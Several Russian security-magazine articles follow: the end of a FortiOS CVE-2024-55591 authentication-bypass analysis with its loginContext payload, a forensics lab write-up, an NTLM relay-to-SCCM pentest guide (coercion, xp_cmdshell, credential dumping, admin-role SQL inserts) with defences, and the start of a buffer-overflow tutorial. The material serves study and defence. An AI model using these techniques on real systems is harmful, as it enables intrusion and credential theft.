радостный ответ сервера — 101  Switching  Protocols. Дальше можем
общаться по WebSocket.





                  Запрос со случайным local_access_token

На этом моменте я сильно обрадовался и подумал, что тайна раскрыта: сер‐
вер ответил мне успешным переходом на WebSocket, а значит, осталось
только отправить туда какую‑нибудь команду и радоваться свеженькому PoC
(спойлер: дальше я точно так же сильно расстроился).
  Все мои попытки хоть как‑то проэксплуатировать обнаруженный недос‐
таток нещадно отвергались сервером — любая отправленная в WebSocket
команда просто оставалась без ответа, а затем соединение обрывалось.
Чтобы разобраться, в чем же проблема, обратимся к инструментам отладки,
которые существуют в FortiOS. Подключаемся по SSH, включаем дебаг
на приложения httpsd и node и снова отправляем запрос. Первое, что мы
видим, — успешная аутентификация в REST API с IP-адреса 127.0.0.1 (имен‐
но эту проблему мы видели в коде модуля Node.js).





                  Успешная аутентификация в REST API

Здесь у меня возник вопрос. Пусть local_access_token не валидируется
модулем Node.js, но почему API успешно аутентифицирует нас, несмотря
на то что этот самый токен — совершенно случайное значение? Чтобы отве‐
тить на него, придется запустить твой любимый дизассемблер  (у меня
это BinaryNinja) и посмотреть на код основного приложения FortiOS — /bin/
init.
   Ориентируясь на дебаг записи, можно предположить, что процесс аутен‐
тификации выполняется функцией (или связан с ней), которая выводит нам
сообщение api_access_check_for_trusted_access. Потому просто ищем
эту строку: к счастью, она используется лишь в одной функции. В ней описана
огромная логика аутентификации в REST API на все случаи жизни, но наш слу‐
чай ведь особенный — мы знаем, что используется User-Agent: Node.js
и запрос приходит с IP-адреса 127.0.0.1. Что‑то подходящее нашлось
в  самом  верху —  функция  api_access_check_for_trusted_access()
вызывает  то, что я назвал is_trusted_ip_and_useragent(), передавая
в качестве аргументов два параметра: заголовки запроса и строку Node.js.





                   api_access_check_for_trusted_access()

Функция is_trusted_ip_and_useragent() играет простую роль: сравнивает
IP-адрес и User-Agent клиента с фиксированными значениями — 127.0.0.1
и Node.js (его передает api_access_check_for_trusted_access()).
   Бинго! Это именно то, что мы видели в коде модуля Node.js в самом
начале статьи, и именно то, почему мы можем получить доступ к REST API, —
local_access_token попросту никак не проверяется. Передав его в зап‐
росе, мы получили возможность достучаться до REST API — дальше отра‐
ботала штатная логика аутентификации локальных клиентов.


             INFO

                     К слову, подобная проблема была обнаружена
                        в FortiOS и ранее. В октябре 2022 года была рас‐
                            крыта уязвимость CVE-2022-40684, которая точ‐
                      но  так же  позволяла  обойти  аутентификацию
                        в REST API, передав параметры client_ip:
                   127.0.0.1 и User-Agent: Report Runner.
                        Подробнее об этой уязвимости можно почитать
                        в блоге Horizon3.ai.





                         is_trusted_ip_and_useragent()

Что ж, мы поняли, почему нам удалось обойти аутентификацию в REST API.
Но что там с CLI и эксплуатацией уязвимости? Вернемся к дебагу FortiOS
и посмотрим, что  происходит после  предоставления нам прав доступа
и начала взаимодействия с CLI. В логе видно, что интерфейс CLI инициали‐
зируется, затем происходит мистический Sending login context и соеди‐
нение закрывается со стороны CLI.





                                    Логи CLI

Ясно, что разработчики добавили дополнительный этап аутентификации
перед предоставлением пользователю доступа к интерфейсу терминала.
Осталось разобраться, что и каким образом отправляется в CLI. Вновь воз‐
вращаемся к коду модуля Node.js и ищем строку Sending login context.


class CliConnection {
    constructor(ws, request, options, groupContext) {
        const args = [
        `"${request.headers["x-auth-login-name"]}"`,
        `"${request.headers["x-auth-admin-name"]}"`,
        `"${request.headers["x-auth-vdom"]}"`,
        `"${request.headers["x-auth-profile"]}"`,
        `"${request.headers["x-auth-admin-vdoms"]}"`,
        `"${request.headers["x-auth-sso"] || SYMBOLS.
SSO_LOGIN_TYPE_NONE_STR}"`,
        request.headers["x-forwarded-client"],
        request.headers["x-forwarded-local"],];
        [...]
        this.logInfo("CLI websocket initialized.");


        const cli = (this.cli = connect({
            port: 8023, // Обрати внимание сюда
            host: "127.0.0.1",
            localAddress: "127.0.0.2",
        }));


        this.logInfo("CLI connection established.");
        [...]
        this.loginContext = args.join(" ");
        [...]
        ws.on("message", (msg) => cli.write(msg)); // Сюда
        cli.setNoDelay().on("data", (data) => this.processData(data))
;


    processData(buf) {
        [...]
        if (data) {
            const ws = this.ws;
            if (this.expectedGreetings) {
            if (data.toString().match(this.expectedGreetings)) {
                this.logInfo("Parsed expected greeting");
                this.expectedGreetings = null;
                this.telnetCommand(CMD.DONT, OPT.ECHO);
                this.logInfo("Sending login context");
                cli.write(`${this.loginContext}\n`); // И сюда
                this.setup();
            }
        [...]

Искомая строка находится в классе CliConnection(). Я обрезал большую
часть, оставив только самое важное. loginContext представляет собой
строку, формируемую из заголовков запроса, который возвращает REST API.
Судя по всему, у нашего пользователя просто нет прав на взаимодействие
с CLI, и именно поэтому соединение обрывается.
  Но важно здесь другое. Вспомни второе изменение, которое разработ‐
чики Fortinet внесли в рамках исправления уязвимости. Строка


ws.on("message", (msg) => cli.write(msg));

была перемещена в отдельную функцию setup().
   Снова удача! То, что мы видим, — уязвимость типа «состояние гонки».
Внимательно посмотри на код этого класса. Все сообщения, полученные
по WebSocket, могут быть доставлены в CLI еще до отправки легитимного
loginContext. Это означает лишь одно: если успеть отправить нужную строку
раньше, чем это сделает Node.js, CLI обработает ее и передаст нам ответ.
  Но что именно нам нужно отправить? В который раз благодарим раз‐
работчиков Fortinet за удобные инструменты для анализа поведения системы
и запускаем встроенный сниффер пакетов, указывая все интерфейсы и порт
8023 (именно он используется для взаимодействия с CLI). Затем открываем
CLI в браузере и смотрим, что мы там смогли наловить.





                          Легитимный loginContext

Вуаля! Та самая строка легитимной аутентификации. Ради интереса снова
попробуем отправить наш «хакерский» запрос и посмотрим, чем он отличает‐
ся.





                          Нелегитимный loginContext

Действительно,    наш     запрос     приходит     от     пользователя
Local_Process_Access, который, судя по всему, просто не имеет необ‐
ходимых прав для взаимодействия с CLI.


PROOF OF CONCEPT

Наконец я смог уже по‑настоящему обрадоваться: вектор эксплуатации был
полностью определен, осталось только написать небольшой скрипт, который
выполнит все, что было выяснено ранее. В этой статье я не буду рассмат‐
ривать процесс написания PoC — у нас тут история совсем не про это. Лишь
кратко опишу логику и покажу результат.
   Итак, нам  требуется:  отправить  запрос в эндпоинт /ws/cli,  указав
в качестве local_access_token случайную строку и требование перевести
общение на WebSocket.
   После инициализации WebSocket-соединения нужно отправить в него
следующий loginContext (указав имя существующей учетной записи адми‐
нистратора):


"admin" "admin" "root" "super_admin" "root" "none" [IP]:PORT [IP]:
PORT

Вслед за loginContext мы должны отправить команду для исполнения (нап‐
ример, get system status). Учитывая, что это уязвимость типа «состояние
гонки», — обработать исключения и, если выполнить команду не удалось,
попробовать снова.





                        CVE-2024-55591 PoC

Ну а вот итоговый результат работы.
ВЗЛОМ





Сегодня мы с тобой будем упражняться
в расследовании атаки, связанной с уста‐
новкой замаскированного ПО, которое зло‐
деи  распространяли  через  социальную
сеть. Поупражняемся в цифровой кримина‐              sab3rt1le                                                                                        FORensics FOR fun ;)
листике и посмотрим, как можно ускорить             @k0n70r4
и облегчить работу.


Решать мы будем лабораторную работу Detroit becomes Human из раздела
Sherlocks на популярном обучающем ресурсе Hack The Box.
   Описание лабораторной работы гласит, что пользователь Alonzo Spire
интересовался возможностями искусственного интеллекта и хотел узнать,
не может ли ИИ помочь ему в повседневных задачах. В социальных сетях он
наткнулся на пост об искусственном интеллекте Google Gemini. Недолго
думая, он скачал инструмент, который рекламировался в посте, но после
установки не смог найти его в своей системе, что вызвало подозрения.
  Нам поручено помочь инженеру, проводящему анализ, найти источник
этого странного инцидента.
   Файлы лабораторной работы представляют собой сборку Kroll Artifact
Parser and Extractor (KAPE), которой мы воспользуемся для получения
криминалистических артефактов.


ВРЕДОНОСНАЯ ССЫЛКА

Начнем расследование с зацепки, данной в описании. Пост в социальной
сети был отправной точкой атаки.
   Среди предоставленных папок есть вот такая:


Triage\C\Users\alonzo.spire\AppData\Local\Microsoft\Edge\User Data\
Default

В ней лежит файл базы данных SQLite History. Откроем файл в DB Browser
и выберем таблицу urls.





Здесь видим ссылку на используемую социальную сеть и на пост. В столбце
last_visit_time указано время, когда пользователь посещал URL. Оно
представлено в формате WebKit/Chrome, который можно конвертировать
в стандартный формат на сайте Epoch Converter.
  В таблице downloads узнаем путь к скачанному файлу и его название.
Обратим внимание на идентификатор загрузки 5 и запомним его.





Таблица dowloads_url_chains помогает понять, что перед скачиванием
файла RAR (идентификатор 5) редирект произошел трижды. Файл был скачан
с URL, который указан в последней строке.





Классификация
В матрице MITRE ATT&CK эта подтехника имеет ID T1204.001 User Execution:
Malicious Link. Она заключается в том, что пользователи могут стать жертвой
социальной инженерии, в том числе через социальные сети. При этом
при переходе по ссылке скачивается вредоносный файл или выполняется
вредоносный код.



МАСКИРОВКА

Журнал Application полезен для отслеживания событий установки ПО. Зная
примерное время установки или используя фильтр по названию, введя слово
Gemini, обнаружим событие MsiInstaller с идентификатором 1042, которое
указывает на завершение процесса установки MSI. Это событие поможет
определить точное время успешной установки пакета в систему.





В этом же  журнале немного  позже замечаем событие с  идентифика‐
тором 1033, которое гласит об успешной установке продукта и раскрывает
его версию.





Чтобы найти установленную вредоносную программу, обратимся к предос‐
тавленным нам журналам PowerShell. Изучая логи за интересующий нас пери‐
од, почти сразу замечаем подозрительный скрипт.





Злоумышленник поместил скрипт ru.ps1 в папку C:\Program Files (x86)\
Google\Install, чтобы замаскировать его под легитимное ПО и избежать
обнаружения.


Классификация
Такая подтехника имеет ID T1036.005 Masquerading: Match Legitimate Name
or  Location.  Злоумышленники  могут  размещать  вредоносные  файлы
в доверенных каталогах (например, System32) или присваивать им безобид‐
ные и приближенные к законным программам имена.


Чтобы продолжить расследование, загрузим предоставленный файл $MFT
в MFTExplorer. Смотрим записи MFT в известной промежуточной дирек‐
тории C:\Program  Files  (x86)\Google\Install и находим там файл
install.cmd, который отвечает за запуск вредоносного ПО.





Давай изучим этот install.cmd. Можем прямо в MFTExplorer посмотреть,
как этот файл выглядит в виде ASCII, и сразу замечаем команду. Раньше мы
видели ту же команду в логах PowerShell.
   Среди собранных артефактов есть еще один подозрительный каталог:


C:\Program Files (x86)\Google\Install\nmmhkkegccagdldgiimedpic

В нем два  файла  .js, меньший по  размеру  (content.js)  имеет  сме‐
щение 3E90C00.





Просмотреть его содержимое можно чуть ниже в том же разделе Overview.
В настоящем расследовании его содержимое могло бы потом заинтересо‐
вать команду, отвечающую за реверс‑инжиниринг и анализ вредоносных
файлов.





ПРОСМОТР ДЕЙСТВИЙ ПОЛЬЗОВАТЕЛЯ

Известно, что пользователь пытался найти в проводнике установленное при‐
ложение. Будем использовать утилиту RegRipper, которая позволяет ана‐
лизировать файлы реестра Windows. Возьмем файл пользователя NTUSER.
DAT, в котором хранятся настройки реестра, специфичные для пользователя,
и плагин WordWheelQuery для извлечения самых последних поисковых зап‐
росов.


rip.exe -r Путь_к_папке_с_заданием\T riage\C\U sers\alonzo.spire\N
TUSER.DAT -p wordwheelquery





После того как пользователь Alonzo Spire не нашел в своей системе никакого
ИИ‑помощника, он удалил загруженный файл. Уточнить время этого действия
можно несколькими способами, рассмотрим пару из них.
   Первый способ — воспользоваться тем же MFTExplorer и проверить папку
$Recycle.Bin. Изучив записи в корзине, обнаружим удаленный файл  .rar,
в котором без распаковки можно найти строку, выдающую связь с AI Gemini.
Такой метод предпочтительнее, поскольку с большей вероятностью под‐
тверждает подлинность данных.





Второй способ предполагает использование утилиты MFTECmd.exe. Вначале
преобразуем $MFT в более удобный формат CSV.


MFTECmd.exe -f "путь/к/папке/с/файлом/$MFT" --csv . --csvf mft_
parsing.csv

Полученный файл открываем при помощи другого инструмента — Timeline
Explorer. В поле Extension ставим фильтр, используя расширение .rar, и соот‐
носим время с таймлайном инцидента.





Попробуем найти хеш MD5 обнаруженного установщика в открытых источни‐
ках. Нам известно имя вредоносного файла:


Google AI Gemini Ultra For PC V1.0.1.msi

На сайте any.run находим всю информацию об этом установщике.





ВЫВОДЫ

Мы рассмотрели инцидент, связанный с распространением вредоносного
ПО при помощи социальной инженерии — а именно вредоносной ссылки.
Далее нам удалось разобрать цепочку доставки вируса на машину жертвы
и узнать, как именно он маскировался. Следом мы попрактиковались в сборе
необходимых для отчета индикаторов компрометации при помощи утилит
MFTExplorer, MFTECmd, Timeline Explorer и RegRipper, которые сильно упро‐
щают расследование.
ВЗЛОМ





Думаю, ты уже много раз слышал, что под‐
держку NTLM  Relay  в  Windows  вот‑вот
отключат. Я  тоже  слышал  это  не  раз,
но сейчас начало 2025 года, и почти на каж‐
дом проекте я до сих пор встречаю NTLM               DrieVlad                                                                                         Пентестер из УЦСБ
Relay. Сегодня я расскажу про актуальные               @VlaDriev
техники  Relay-атак,  связанные с SCCM,
а также методы защиты от них.


Минутка исторического экскурса. В конце 2023 года коллеги из Specterops
опубликовали исследование, в котором подробно раскрыли техники повыше‐
ния привилегий в домене AD через эксплуатацию серверов SCCM (System
Center Configuration Manager). С тех пор вышло еще несколько крутых ресер‐
чей на ту же тему. Если хочешь фундаментально во всем разобраться — доб‐
ро пожаловать в репозиторий на GitHub, где собраны и упорядочены техники
получения учеток, повышения привилегий и постэксплуатации, связанные
с SCCM. Здесь же я хочу наглядно продемонстрировать, как можно поль‐
зоваться атаками NTLM Relay на SCCM.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ТЕОРИЯ

Для тех, кто только погружается в тему и еще не знает, что такое SCCM, дам
небольшую справку. Итак, System Center Configuration Manager (с 2020 года
известен как Microsoft Endpoint Configuration Manager, MECM) — это ПО
для  централизованного  управления. В  официальной  документации мне
не удалось обнаружить четкого определения, что это за сущность и зачем
нужна, поэтому я сформулировал его самостоятельно.
   Можно заметить, что это определение, по сути, описывает сам Active
Directory (далее AD). На самом деле — и да и нет: Configuration Manager был
создан для облегчения жизни ИТ‑администраторам, а также для снижения
затрат на администрирование.
   Приведу простой пример. Когда в твоей компании тысяча сотрудников,
с администрированием может справиться условно пять человек, а что, если
компания выросла до десяти тысяч или даже ста тысяч человек? Наймем
пятьдесят или пятьсот человек соответственно? Конечно, мы хотим избежать
линейной зависимости, для этого и был придуман сначала AD, а после
Configuration Manager.
  SCCM  зачастую  встречается  в  достаточно  больших  компаниях,  где
количество пользователей давно перевалило за десять тысяч. Он объединяет
в себе почти все возможные оснастки в AD и позволяет более эффективно
управлять рабочими станциями, софтом и всем остальным.
  Для подтверждения моих слов — скриншот из официальной докумен‐
тации.





                           Документация Microsoft

Также я выделил ключевую мысль: «может повлиять на каждый компьютер
в организации». Но оговорюсь: при условии, если компьютер находится
под управлением сервера SCCM.
  Со структурой помогла разобраться схема, приведенная ниже.





                  Схема устройства сайтов SCCM/MECM

Вот ключевые составляющие SCCM:
 • Архитектура  «клиент‑сервер».  Клиентами  выступают  все  узлы
   домена, например DC или Exchange, а сервером — мастер SCCM.
 • Реализована  отказоустойчивость. Она  достигается добавлением
   пассивного сервера, готового перехватить обязанности мастера в случае,
   если тот выйдет из строя.
 • Работает в терминах сайтов. Здесь всё из официальной докумен‐
   тации, просто нужно привыкнуть к терминологии: сайтов в одном домене
  AD может быть несколько.
 • Реализована иерархия сайтов. Сайты могут быть связаны между
   собой дочерними отношениями. Каждый сайт можно атаковать незави‐
  симо от другого.
 • Реализована ролевая модель. В сайтах SCCM используется хорошо
   проработанная ролевая модель как для пользователей, так и для сер‐
   веров. Подробно на этом останавливаться не буду, в рамках статьи важны
   только две роли: Full administrator для пользователей и Site system
   servers для серверов. Подробнее про ролевую модель серверов можно
   прочитать в документации (также — в разделе для пользователей).
 • Использует MSSQL. SCCM вообще не может существовать без MSSQL.
  В БД хранится вся служебная информация, например таблицы с записями
   про роли. Оснастка MSSQL может быть развернута на мастере, но зачас‐
   тую выделяется в отдельный сервер.


РАЗВЕДКА

На этом пора заканчивать с теорией и приступать к практике. В качестве
стенда я взял лабу GOAD. Если у тебя возникнет желание попробовать все
описанное ниже, то ты без проблем развернешь стенд и проведешь тесты.
Схема стенда достаточно понятная, у меня будет SCCM/MECM, контроллер
домена, который не находится под управлением SCCM, клиент SCCM и сер‐
вер с MSSQL для хранения всей служебной информации.





                   Схема стенда для проведения тестов

Все дальнейшие действия подразумевают наличие у атакующего учетной
записи в домене AD.
  В первую очередь мы должны понять, есть ли в домене SCCM. Сделать
это можно с помощью одного нехитрого LDAP-запроса:


ldapsearch -E pr=10000/noprompt -D <username>@<domain> -w <password>
-x -H ldap://<IP> -b
DC=<domain>,DC=<domain> '(objectclass=mssmsmanagementpoint)'
dnshostname,msSMSSiteCode

Также в сообществе разработали инструмент для автоматизации всей раз‐
ведки — sccmhunter.py. Можно воспользоваться им, тогда вся полученная
информация еще будет упорядочена в красивые таблицы.





                   Разведка SCCM с помощью sccmhunter

После разведки через LDAP можно провести разведку по SMB. Это будет
вполне по силам сделать руками.





           Разведка SCCM через SMB с помощью CrackMapExec

Но лучше автоматизировать.





             Разведка SCCM через SMB с помощью sccmhunter

Благодаря этой разведке мы обнаруживаем SiteCode и проверяем SMB
Signing.  Отсутствие  требования  подписи SMB и SiteCode необходимы
для дальнейших атак.





                           Результаты разведки SCCM

Серверы мы обнаружили, теперь повысим привилегии несколькими способа‐
ми.


TAKEOVER1

Снова обратимся к схеме стенда.





На ней четко видно, что учетная запись компьютера MECM$ является админис‐
тратором базы данных на сервере Microsoft SQL. Единственная проблема —
где взять учетку MECM$? Но тут вспоминаем про атаку NTLM Relay и технику
принуждения к аутентификации (Coerce).
   Запускаем ntlmrelayx.





Выполняем атаку принуждения к аутентификации с помощью PetitPotam.





Получаю положительный результат — установленную сессию Microsoft SQL
от имени MECM$.





Подключаюсь к SCCM, используя установленную сессию.





После  получения  шелла  пробую  по  классике  выполнить  код  через
xp_cmdshell.





Итак, у меня есть RCE на сервере SCCM/MECM, но правда ли это конечная
цель? Более того, учетка sccm-sql — это локальный администратор на сер‐
вере.





                   Возможности учетной записи sccm-sql

И тут проверка на внимательность. В самом начале статьи я упомянул, что
сайты SCCM строятся на Microsoft SQL и вся информация о ролях хранится
в БД. Попробую выполнить несколько SQL-запросов, чтобы добавить своей
учетке роль администратора и права на выполнение скриптов.





Давай разберемся, что произошло выше. Я вставляю строку в таблицу
с говорящим названием RBAC_Admins. Длинное значение из непонятных сим‐
волов — это шестнадцатеричное представление SID пользователя, которого
надо добавить в администраторы. Значение SourceSite — это имя сайта,
которое обнаружили на этапе разведки по SMB.


             INFO

                     На одном сервере Microsoft SQL может быть нес‐
                            колько сайтов SCCM, и тогда нужно внимательно
                          отслеживать, в какой именно добавляется новая
                         запись.  Первая  команда — use  CM_P01 —
                         как раз нужна для этого.


Далее еще нужно накинуть привилегии на определенные типы объектов.





  Выполнение SQL-запросов для расширения привилегий в рамках сайта
 SCCM

На самом деле от сайта к сайту меняться будет только подчеркнутое зна‐
чение. Это и есть уникальный идентификатор пользователя в рамках сайта
SCCM. Присвоен этот идентификатор был автоматически при добавлении
пользователя в таблицу, а перечислил я его на скриншоте выше.


             INFO

                            Если  хочешь  подробнее  погрузиться  в  тему,
                        рекомендую заглянуть в документацию. А еще
                        любопытное наблюдение: если назначить поль‐
                         зователю  роль  администратора  «правильно»,
                       через оснастку, а потом заглянуть в БД, то там
                        будут записи такого же формата в тех же таб‐
                         лицах, что я описал выше.


Для любителей автоматизации: sccmhunter поможет собрать правильные
SQL-запросы, и останется их только выполнить.





   Демонстрация автоматизации выполнения атаки с помощью sccmhunter

Итак, на этом этапе я успешно повысил привилегии в рамках сайта SCCM,
а как это эксплуатировать, расскажу чуть позже. Сначала — про другие
методы повышения привилегий.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
         RELAY AGAIN
         ИЗУЧАЕМ АКТУАЛЬНЫЕ ТЕХНИКИ
            АТАК NTLM RELAY ЧЕРЕЗ SCCM





TAKEOVER2

Ты еще помнишь схему, которую я разбирал в начале описания TAKEOVER1?
Обратимся к ней снова.





На схеме четко видно, что учетная запись компьютера MECM$ находится
в группе локальных администраторов на сервере Microsoft SQL. При такой
конфигурации  атакующий может  попробовать  реализовать NTLM  Relay
на SMB или RPC. В этом и заключается суть TAKEOVER2, но не без нюансов.
Впрочем, с ними сейчас разберемся.


             INFO

                    По моему мнению, эта  техника  стоит именно
                       на втором месте в классификации из‑за того, что
                        с NTLM Relay на SMB ситуация стала немного
                            лучше. Я часто замечаю, что в инфраструктурах
                             настроено требование принудительной подписи
                    SMB. А вот с Microsoft SQL все не так гладко,
                      защита  от  Relay-атак  зачастую не  настроена
                         вообще нигде.


Запускаю ntlmrelayx для выполнения атаки.





Выполняю принуждение к аутентификации с помощью PetitPotam.





Получаю положительный результат.





После успешно установленной SMB-сессии сразу пробую создать дамп
веток реестра HKLM\SAM и HKLM\SECURITY.





            Результат выполнения secretsdump на узле 192.168.60.12

В результате получаю учетную запись локального администратора на ата‐
куемом сервере, саму учетную запись сервера, а еще учетную запись sccm-
sql с паролем в открытом виде.


             INFO

                          Пароль в  открытом виде  находится в HKLM\
                   SECURITY.  Это  особенность  запуска  служб
                        в Windows. Чтобы избежать этого, можно исполь‐
                         зовать GMSA.  Подробнее —  в  официальной
                         документации.


В этот момент снова вспоминаю схему и понимаю, что учетная запись sccm-
sql — это администратор БД на сервере Microsoft SQL. Попробую подклю‐
читься к БД.





Снова получаю шелл на Microsoft SQL, а дальше атака сводится к TAKEOVER1.
По  аналогии  с  предыдущим  кейсом  выполняю  четыре  SQL-запроса
для повышения привилегий в рамках сайта SCCM. Выполняю код на целевом
устройстве, которым зачастую является контроллер домена.


        WWW

                        Можно еще попробовать выполнить NTLM Relay
                       на RPC, но для его успешной реализации тре‐
                            буется наличие на  сервере  уязвимости CVE-
                        2020-1113.



TAKEOVER5

Создатель стенда GOAD не закладывал возможность демонстрации этой тех‐
ники, но, если очень захотеть, можно протестировать и ее.
   Суть  техники  заключается в проведении  атаки NTLM Relay на HTTP
для повышения привилегий через WMI. Чтобы провести атаку, понадобится
пропатчить ntlmrelayx.
   Нам понадобится любая учетная запись в домене AD, плюс нужно знать
SID этой учетной записи. Его можно посмотреть в BloodHound в атрибутах
пользователя или запросить через LDAP, например как на скриншоте ниже.





                   Получение SID пользователя через LDAP

Запускаем ntlmrelayx, чтобы провести атаку и повысить привилегии на сайте
SCCM пользователю eve. NTLM Relay направлена на SMS-сервер, который
может быть настроен на мастере или вынесен на отдельный узел.





              Запуск ntlmrelayx для проведения атаки TAKEOVER5

Теперь используем принуждение к аутентификации, например с помощью
PetitPotam, против мастер‑сервера или резервного. Но стенд не предус‐
матривает наличие двух таких серверов, поэтому  искусственно пришлю
аутентификацию на ntlmrelayx.





   Отправка NTLM-аутентификации для демонстрации работоспособности
   кейса

Получаю  результат  выполнения  атаки.  Подконтрольной  учетной записи
добавлена роль администратора сайта SCCM.





В результате выполнения такой несложной, но очень эффективной атаки я
снова добавил подконтрольной учетной записи роль администратора сайта
SCCM.


ПОВЫШЕНИЕ ПРИВИЛЕГИЙ В ДОМЕНЕ AD

Я трижды смог повысить права своей учетке до полного администратора сай‐
та SCCM, но что это дает? Возможность выполнения команд через SCCM API.
Сделать это можно через оснастку с помощью SharpSCCM или sccmhunter.





   Получение оболочки для взаимодействия с сайтом SCCM с помощью
  sccmhunter





                Перечисление администраторов сайта SCCM

Чтобы начать взаимодействовать с каким‑либо компьютером в домене, сна‐
чала нужно найти идентификатор целевого хоста на сайте SCCM. Делается
это в одну команду через sccmhunter.


get_device <DNSHostName>





      Получение уникального идентификатора узла в рамках сайта SCCM

В полученном выводе обращаем внимание на поле ResourceId.
   Теперь попробуем выполнить команды непосредственно на компьютере.





                 Переключение оболочки на атакуемый узел

Получилось перечислить директории, но хочется проверить, можно ли сде‐
лать что‑то поинтереснее, например добавить пользователя в группу локаль‐
ных администраторов. Для этого создаю простой скрипт для добавления под‐
контрольной учетной записи в группу локальных администраторов.





А перед тем, как его выполнить, необходимо уточнить один момент. По умол‐
чанию SCCM настроен так, что вновь созданный скрипт должен подтвердить
еще один администратор — как раз чтобы убедиться, что в нем не содер‐
жится ошибок или чего‑то деструктивного. Практика показывает, что эту меру
безопасности целенаправленно убирают. А если такая ситуация все‑таки
возникнет, можно добавить еще одному пользователю AD роль администра‐
тора SCCM, для этого достаточно лишь одного администратора.
  В sccmhunter  реализована механика подтверждения  скрипта вторым
администратором, поэтому сразу указываю две учетные записи и выполняю
нужные действия.





     Добавляем пользователя carol в группу локальных администраторов


             INFO

                      Все команды выполняются через WMI, который
                            используется в качестве транспорта HTTP.


После успешного выполнения команды снова попробую перечислить сетевые
диски. Доступ к сетевым дискам ADMIN$ и С$ показывает, что наш поль‐
зователь стал локальным администратором.





       Юзер carol добавлен в группу локальных администраторов


             INFO

                     На собственном опыте могу сказать, что в 100%
                            случаев под управлением SCCM находились так‐
                     же и контроллеры домена. Так что все действия,
                       которые будут показаны далее, обычно выпол‐
                          няются на DC.



ЗАЩИТА

В целом методы защиты от атак NTLM Relay обсуждаются со времен появ‐
ления самой атаки. Защищаться нужно от получения атакующим NTLM-аутен‐
тификации  (spoofing, MITM, Coerce и  прочих методов), а  также  стоит
защищать конечные точки, куда NTLM Relay будет направлена (SMB, MSSQL,
HTTP, LDAP, RPC). Подробнее можно  прочитать в официальной статье
Microsoft или в предыдущих статьях про NTLM Relay. Здесь же хочу подробно
разобрать защиту именно от NTLM Relay на Microsoft SQL, так как ранее эта
техника не была настолько полезной.


MICROSOFT SQL

В Microsoft уже давно поняли, что от NTLM Relay надо защищаться, и раз‐
работали штатные средства для этого. Называются они Extended Protection
и Force Encryption. Настроить их можно с помощью стандартной оснастки SQL
от Microsoft.
 1. Открываем оснастку.
 2. Раскрываем SQL Server Network Configuration.
 3. Нажимаем правой кнопкой мыши на Protocols for MSSQLSERVER.
 4. Выбираем Properties.
 5. Нажимаем Advanced.
 6. Меняем значение Extended Protocols Protection: Required.
 7. Нажимаем Flags.
 8. Меняем значение Force Encryption: Yes.
 9. Нажимаем Apply.
10. Нажимаем OK.





                  Применение настройки Force Encryption





                 Применение настройки Extended Protection


БОНУС

Небольшой бонус для атакующих и защитников. Как массово проверить
инфраструктуру на наличие требования подписи Microsoft SQL? Есть удобный
инструмент mssqlrelay. Он пока не умеет работать по подсетям или файлам
с таргетами, но всегда можно запустить его в цикле.
  С его помощью легко проверить, включена ли защита на конечных точках.


mssqlrelay check -target-ip <IP>





   Результат проверки узла с включенной настройкой принудительного
  шифрования





   Результат проверки узла с выключенной настройкой принудительного
  шифрования

Зачастую на реальных пентестах защита конечных точек Microsoft SQL отклю‐
чена.


ВЫВОДЫ

В статье рассмотрено три кейса с NTLM Relay на SCCM, но на самом деле их
существует больше. Но все они строятся на уже известных тебе по предыду‐
щим статьям  техниках, например NTLM Relay на LDAP + кейс с RBCD
или ShadowCreds. Или NTLM Relay на ADCS для выпуска сертификата от име‐
ни мастер‑сервера с дальнейшим его захватом.


             INFO

                      •Гид по NTLM Relay. Захватываем NTLM-аутен‐
                          тификацию для Relay-атаки
                      •Гид по NTLM Relay, часть 2. Проводим Relay-
                                атаки





Второй вывод — рано еще списывать со счетов старую добрую атаку NTLM
Relay, я думаю, еще долгое время NTLM будет существовать в инфраструк‐
турах. Отказаться от него непросто, и даже на Windows 11 и Server 2022 его
будут намеренно включать для поддержки легаси.
ВЗЛОМ





Символический  эмулятор  Angr  поможет
перехватить управление в чужом коде, дос‐
таточно лишь  указать ему  направление
поиска. В этой статье узнаем, как с его
помощью  находить  аналогичные  дыры              mr.grogrig                                                                                            mr.grogrig@gmail.com
в приложениях, напишем анализатор inline-
функций и  создадим  рабочий  эксплоит
для настоящего FTP-сервера.


             INFO

                            Если хочешь больше узнать про Angr, советую
                            заглянуть в мою прошлую статью — «Управление
                           гневом. Изучаем Angr — фреймворк символичес‐
                       кой эмуляции».



UNCONSTRAINED

Давай напишем и соберем подопытный экземпляр — небольшую программу,
которая заведомо будет уязвима к переполнению буфера. Флаги сборки
гарантируют статичный ImageBase и отсутствие стековой канарейки, чем зна‐
чительно упрощают нам жизнь.


// gcc exp2.c -m32 -fno-stack-protector -no-pie -o exp2_32


#include <stdio.h>
#include <string.h>
#include <stdlib.h>


void win()
{
    printf("Win!\n");
}


void func(int key)
{
    char buf[32];
    printf("overflow me : ");
    gets(buf);
}


int main(int argc, char* argv[])
{
    func(1);
    return 0;
}

Код принимает введенную  строку в локальный буфер. Наша задача —
переполнить буфер таким образом, чтобы передать управление в функцию
win.


08049196  int32_t win()
080491b3  e8b8feffff         call    puts



080491c1  char* func()
080491c1  55                 push    ebp {__saved_ebp}
080491c2  89e5               mov     ebp, esp {__saved_ebp}
080491c4  53                 push    ebx {__saved_ebx}
080491c5  83ec24             sub     esp, 0x24


080491e8  8d45d8             lea     eax, [ebp-0x28 { buf}]
080491eb  50                 push    eax { buf} {var_3c}
080491ec  e86ffeffff         call    gets


080491f8  c9                 leave    {__saved_ebp}
080491f9  c3                 retn     {__return_addr}



080491fa  int32_t main(int32_t argc, char** argv, char** envp)
08049218  68efbeadde         push    0x1
0804921d  e89fffffff         call    func
08049222  83c410             add     esp, 0x10

Подсмотрим в отладчике актуальные адреса. На входе в функцию func()
на вершине стека лежит адрес возврата. Пролог сохраняет в стеке старый
EBP, после чего вычитает 0x24 из ESP, образуя на стеке «карман» под локаль‐
ные данные.


0xffffd6a0: 00 00 00 00 # buf
# (...) local variables
0xffffd6c4: 00 80 f9 f7  # old EBX
0xffffd6c8: e8 d6 ff ff  # old EBP
0xffffd6cc: 22 92 04 08  # ret addr -> 0x08049222

